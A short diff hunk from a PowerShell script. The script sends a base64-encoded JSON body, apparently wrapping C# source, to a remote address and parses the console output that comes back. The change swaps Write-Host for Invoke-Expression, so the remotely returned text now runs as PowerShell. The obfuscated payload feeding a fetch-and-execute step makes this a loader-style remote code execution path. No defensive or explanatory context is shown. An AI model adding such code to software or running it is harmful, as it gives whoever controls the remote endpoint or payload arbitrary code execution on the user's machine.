@@ -3,4 +3,4 @@ $jsonpostrequestbase64 = "eyJDb2RlQmxvY2siOiJ1c2luZyBTeXN0ZW07XG51c2luZyBTeXN0ZW
 $jsonpostrequest = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$jsonpostrequestbase64"))
 $sendrequest = Invoke-WebRequest -Uri $destinationaddr -Method POST -Body $jsonpostrequest -ContentType "application/json"
 $parsedoutput = ((($sendrequest.Content | ConvertFrom-Json | Select ConsoleOutput) -replace "@{ConsoleOutput=", "") -replace '\r?\n[^\n]*\Z')
-Write-Host $parsedoutput
+Invoke-Expression $parsedoutput
